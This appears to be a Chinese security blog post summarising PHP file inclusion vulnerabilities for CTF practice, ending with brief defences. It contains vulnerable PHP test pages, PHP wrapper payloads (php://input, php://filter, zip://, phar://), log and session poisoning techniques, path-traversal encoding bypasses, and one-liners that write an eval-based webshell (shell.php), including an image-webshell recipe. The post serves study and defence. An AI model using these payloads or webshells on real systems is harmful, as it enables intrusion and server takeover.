    <content><![CDATA[<h2 id="0x01-什么是文件包含漏洞"><a href="#0x01-什么是文件包含漏洞" class="headerlink" title="0x01 什么是文件包含漏洞"></a>0x01 什么是文件包含漏洞</h2><p>通过PHP函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。<br><br></p>
<h2 id="0x02-文件包含漏洞的环境要求"><a href="#0x02-文件包含漏洞的环境要求" class="headerlink" title="0x02 文件包含漏洞的环境要求"></a>0x02 文件包含漏洞的环境要求</h2><ul>
<li>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</li>
<li>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件<br><br></li>
</ul>
<h2 id="0x03-常见文件包含函数"><a href="#0x03-常见文件包含函数" class="headerlink" title="0x03 常见文件包含函数"></a>0x03 常见文件包含函数</h2><p>php中常见的文件包含函数有以下四种：</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_once()</li>
<li><p>require()_once()</p>
<p>include与require基本是相同的，除了错误处理方面:</p>
</li>
<li>include()，只生成警告（E_WARNING），并且脚本会继续</li>
<li>require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本</li>
<li>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上<br><br></li>
</ul>
<h2 id="0x04-PHP伪协议"><a href="#0x04-PHP伪协议" class="headerlink" title="0x04  PHP伪协议"></a>0x04  PHP伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<h3 id="一、php-input"><a href="#一、php-input" class="headerlink" title="一、php://input"></a>一、php://input</h3><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212171710961.png" alt="在这里插入图片描述"></p>
<p><strong>Example 1：</strong> 造成任意代码执行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"php://filter"</span>) || stristr($file,<span class="string">"zip://"</span>) || stristr($file,<span class="string">"phar://"</span>) || stristr($file,<span class="string">"data:"</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($file!=<span class="string">"http://www.baidu.com"</span>) <span class="keyword">echo</span> <span class="string">"tips：flag在当前目录的某个文件中"</span>;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;a href="?file=http://www.baidu.com"&gt;click go baidu&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/13/文件包含漏洞总结/20190212171849262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212172017164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212185213880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
<pre><code>&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;
</code></pre><p><strong>Example 2：</strong> 文件内容绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$a= $_GET[<span class="string">"a"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a)&amp;&amp;(file_get_contents($a,<span class="string">'r'</span>)) === <span class="string">'I want flag'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"success\n"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'flag&#123;flag_is_here&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>审计test.php知，当参数\$a不为空，且读取的文件中包含’I want flag’时，即可显示\$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。<br>注：遇到file_get_contents()要想到用php://input绕过。</p>
<p><img src="/2019/02/13/文件包含漏洞总结/20190212173415247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="二、php-filter"><a href="#二、php-filter" class="headerlink" title="二、php://filter"></a>二、php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br><img src="/2019/02/13/文件包含漏洞总结/20190212181216425.png" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212181226147.png" alt="在这里插入图片描述"><br>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
<p>注：更多php://filter用法可参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
<p><strong>Example 1：</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"php://input"</span>) || stristr($file,<span class="string">"zip://"</span>) || stristr($file,<span class="string">"phar://"</span>) || stristr($file,<span class="string">"data:"</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>1.点击tip后进入如下页面，看到url中出现‘file=flag.php’，如下：<br><img src="/2019/02/13/文件包含漏洞总结/20190212181928339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.尝试payload：?php://filter/resource=flag.php，发现无法显示内容：<br><img src="/2019/02/13/文件包含漏洞总结/20190212182033920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.尝试payload：?php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</p>
<p><img src="/2019/02/13/文件包含漏洞总结/20190212182541177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="三、zip"><a href="#三、zip" class="headerlink" title="三、zip://"></a>三、zip://</h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
<ul>
<li>zip://中只能传入绝对路径。</li>
<li>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</li>
<li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" alt="在这里插入图片描述"><br><strong>Example 1：</strong><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span> (!$file) <span class="keyword">echo</span> <span class="string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"input"</span>)||stristr($file, <span class="string">"filter"</span>)||stristr($file,<span class="string">"data"</span>)<span class="comment">/*||stristr($file,"phar")*/</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"hick?"</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">include</span>($file.<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> &gt;</span><br><span class="line">	 &lt;input type=<span class="string">"file"</span> name=<span class="string">"fupload"</span> /&gt;</span><br><span class="line"> 	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">you can upload jpg,png,zip....&lt;br /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_FILES[<span class="string">'fupload'</span>] ) ) &#123;</span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'fupload'</span> ][ <span class="string">'name'</span> ];         <span class="comment">//文件名</span></span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);   <span class="comment">//文件后缀</span></span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'fupload'</span> ][ <span class="string">'size'</span> ];         <span class="comment">//文件大小</span></span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'fupload'</span> ][ <span class="string">'tmp_name'</span> ];     <span class="comment">// 存储在服务器的文件的临时副本的名称</span></span><br><span class="line">    $target_path = <span class="string">"uploads\\"</span>.md5(uniqid(rand())).<span class="string">"."</span>.$uploaded_ext;</span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> || strtolower( $uploaded_ext ) == <span class="string">"zip"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;<span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;<span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>.dirname(<span class="keyword">__FILE__</span>).<span class="string">"\\&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="四、data-与phar"><a href="#四、data-与phar" class="headerlink" title="四、data://与phar://"></a>四、data://与phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212184105566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
<ul>
<li>phar://中相对路径和绝对路径都可以使用<br><img src="/2019/02/13/文件包含漏洞总结/20190212183933220.png" alt="在这里插入图片描述"><br><br><h2 id="0x05-包含Apache日志文件"><a href="#0x05-包含Apache日志文件" class="headerlink" title="0x05 包含Apache日志文件"></a>0x05 包含Apache日志文件</h2>&emsp;&emsp;WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。<br><img src="/2019/02/13/文件包含漏洞总结/20190212212338582.png" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212212352893.png" alt="在这里插入图片描述"><br>&emsp;&emsp;Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>&emsp;&emsp;如果访问一个不存在的资源时，如<a href="http://www.xxxx.com/" target="_blank" rel="noopener">http://www.xxxx.com/</a>&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt;  写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全期间，安装apache时尽量不要使用默认路径。</li>
</ul>
<p>参考文章：<a href="https://www.cnblogs.com/my1e3/p/5854897.html" target="_blank" rel="noopener">1.包含日志文件getshell</a><br>&emsp;&emsp;&emsp;&emsp;&emsp;<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">2.一道包含日志文件的CTF题</a><br><br></p>
<h2 id="0x06-包含SESSION"><a href="#0x06-包含SESSION" class="headerlink" title="0x06 包含SESSION"></a>0x06 包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>找到Session内的可控变量</li>
<li>Session文件可读写，并且知道存储路径</li>
</ul>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt="在这里插入图片描述"><br><strong>session常见存储路径：</strong></p>
<ul>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
<li>session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</li>
</ul>
<p>参考文章：<a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">一道SESSION包含的CTF题</a><br><br></p>
<h2 id="0x06-包含-pros-self-environ"><a href="#0x06-包含-pros-self-environ" class="headerlink" title="0x06 包含/pros/self/environ"></a>0x06 包含/pros/self/environ</h2><p>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ul>
<p>参考文章：<a href="http://websecuritylog.blogspot.com/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">proc / self / environ Injection</a><br><br></p>
<h2 id="0x07-包含临时文件"><a href="#0x07-包含临时文件" class="headerlink" title="0x07 包含临时文件"></a>0x07 包含临时文件</h2><p><img src="/2019/02/13/文件包含漏洞总结/1.jpg" alt="在这里插入图片描述"><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">LFI With PHPInfo Assistance</a></p>
<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a><br><br></p>
<h2 id="0x08-包含上传文件"><a href="#0x08-包含上传文件" class="headerlink" title="0x08 包含上传文件"></a>0x08 包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p>
<p>图片马的制作方式如下，在cmd控制台下输入：<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">进入<span class="number">1.</span>jph和<span class="number">2.</span>php的文件目录后，执行：</span><br><span class="line"></span><br><span class="line">copy  <span class="number">1.</span>jpg/b+<span class="number">2.</span>php  <span class="number">3.</span>jpg</span><br><span class="line"></span><br><span class="line">将图片<span class="number">1.</span>jpg和包含php代码的<span class="number">2.</span>php文件合并生成图片马<span class="number">3.</span>jpg</span><br></pre></td></tr></table></figure></p>
<p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code><br>图片代码如下：</p>
<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&apos;pass&apos;]);?&gt;&quot;)?&gt;
</code></pre><p>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code><br><br></p>
<h2 id="0x09-其他包含姿势"><a href="#0x09-其他包含姿势" class="headerlink" title="0x09 其他包含姿势"></a>0x09 其他包含姿势</h2><ul>
<li>包含SMTP(日志)</li>
<li>包含xss<br><br><br><br></li>
</ul>
<h1 id="文件包含漏洞的绕过方法"><a href="#文件包含漏洞的绕过方法" class="headerlink" title="文件包含漏洞的绕过方法"></a>文件包含漏洞的绕过方法</h1><p><br></p>
<h2 id="0x09-指定前缀绕过"><a href="#0x09-指定前缀绕过" class="headerlink" title="0x09 指定前缀绕过"></a>0x09 指定前缀绕过</h2><h3 id="一、目录遍历"><a href="#一、目录遍历" class="headerlink" title="一、目录遍历"></a>一、目录遍历</h3><p>使用 ../../ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=../../phpinfo/phpinfo.php<br>测试代码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//前缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>现在在/var/log目录下有文件flag.txt，则利用../可以进行目录遍历，比如我们尝试访问：</p>
<pre><code>include.php?file=../../log/flag.txt
</code></pre><p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，即 /var/log/flag.txt，从而包含成功。</p>
<h3 id="二、编码绕过"><a href="#二、编码绕过" class="headerlink" title="二、编码绕过"></a>二、编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。<br><strong>1.利用url编码</strong></p>
<ul>
<li><p>../</p>
<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li><p>..\</p>
<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
<p><strong>2.二次编码</strong></p>
<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
<p><strong>3.容器/服务器的编码方式</strong></p>
<ul>
<li><p>../</p>
<ul>
<li><p>..%c0%af</p>
<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li><p>%c0%ae%c0%ae/</p>
<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）<br>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li><p>..\</p>
<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
<p><br></p>
<h2 id="0x10-指定后缀绕过"><a href="#0x10-指定后缀绕过" class="headerlink" title="0x10 指定后缀绕过"></a>0x10 指定后缀绕过</h2><p>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="一、利用url"><a href="#一、利用url" class="headerlink" title="一、利用url"></a>一、利用url</h3><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br>可参考此文章：<a href="https://www.jianshu.com/p/2c07fbb52b45" target="_blank" rel="noopener">URI’s fragment</a></p>
<p>完整url格式：</p>
<pre><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment
</code></pre><p><strong>query(?)</strong></p>
<ul>
<li>[访问参数]   <code>?file=http://localhost:8081/phpinfo.php?</code></li>
<li>[拼接后] &emsp;<code>?file=http://localhost:8081/phpinfo.php?.txt</code></li>
</ul>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/2019021223193847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212231954243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>fragment(#)</strong></p>
<ul>
<li>[访问参数]   <code>?file=http://localhost:8081/phpinfo.php%23</code></li>
<li><p>[拼接后]&emsp; <code>?file=http://localhost:8081/phpinfo.php#.txt</code></p>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/20190212232732360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/2019021223280591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="二、利用协议"><a href="#二、利用协议" class="headerlink" title="二、利用协议"></a>二、利用协议</h3><p>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</p>
</li>
</ul>
<p><strong>zip://</strong></p>
<ul>
<li>[访问参数]   <code>?file=zip://D:\zip.jpg%23phpinfo</code></li>
<li>[拼接后] &emsp;<code>?file=zip://D:\zip.jpg#phpinfo.txt</code></li>
</ul>
<p><strong>phar://</strong></p>
<ul>
<li>[访问参数]   <code>?file=phar://zip.zip/phpinfo</code></li>
<li>[拼接后] &emsp;<code>?file=phar://zip.zip/phpinfo.txt</code></li>
</ul>
<p><strong>Example：</strong><br>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码&lt;?php phpinfo();?&gt;)）<br>所以分别构造payload为：</p>
<p><code>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234709548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>?file=phar://../../php.zip/phpinfo</code><br><img src="/2019/02/13/文件包含漏洞总结/20190212234725870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="三、长度截断"><a href="#三、长度截断" class="headerlink" title="三、长度截断"></a>三、长度截断</h3><p><strong>利用条件：</strong> </p>
<ul>
<li>php版本 &lt; php 5.2.8</li>
</ul>
<p><strong>原理：</strong></p>
<ul>
<li>Windows下目录最大长度为256字节，超出的部分会被丢弃</li>
<li><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
<p><strong>利用方法：</strong></p>
</li>
</ul>
<ul>
<li><p>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</p>
<pre><code>?file=./././。。。省略。。。././shell.php
</code></pre></li>
</ul>
<p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p>
<h3 id="四、-00截断"><a href="#四、-00截断" class="headerlink" title="四、%00截断"></a>四、%00截断</h3><p><strong>利用条件：</strong></p>
<ul>
<li>magic_quotes_gpc = Off </li>
<li>php版本 &lt; php 5.3.4</li>
</ul>
<p><strong>利用方法：</strong></p>
<ul>
<li><p>直接在文件名的最后加上%00来截断指定的后缀名</p>
<pre><code>?file=shell.php%00
</code></pre></li>
</ul>
<p>注：现在用到%00阶段的情况已经不多了</p>
<p><br><br><br></p>
<h1 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h1><p><br></p>
<ul>
<li><strong>allow_url_include和allow_url_fopen最小权限化</strong></li>
<li><p><strong>设置open_basedir（open_basedir 将php所能打开的文件限制在指定的目录树中）</strong></p>
</li>
<li><p><strong>白名单限制包含文件，或者严格过滤 . \/ \</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>谈一谈PHP反序列化</title>
